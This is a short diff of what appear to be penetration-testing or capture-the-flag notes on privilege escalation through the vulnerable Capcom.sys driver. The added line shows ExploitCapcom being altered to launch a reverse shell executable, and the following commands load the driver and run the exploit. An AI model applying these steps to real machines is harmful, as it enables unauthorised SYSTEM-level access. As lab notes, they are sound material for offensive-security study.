@@ -196,7 +196,7 @@ Driver
 https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys
 
 driver exploit --> compile
-https://github.com/tandasat/ExploitCapcom  --> add reverseshell!!!!!!
+https://github.com/tandasat/ExploitCapcom  --> add reverseshell!!!!!!    (TEXT("C:\\Windows\\system32\\cmd.exe");---->TEXT("C:\\Users\\printsvc\\Desktop\\rev_9001.exe"))
 
 -->> .\LoadDriver.exe System\CurrentControlSet\hack C:\Users\svc-print\capcom.sys
 -->> .\ExploitCapcom.exe (change shell)
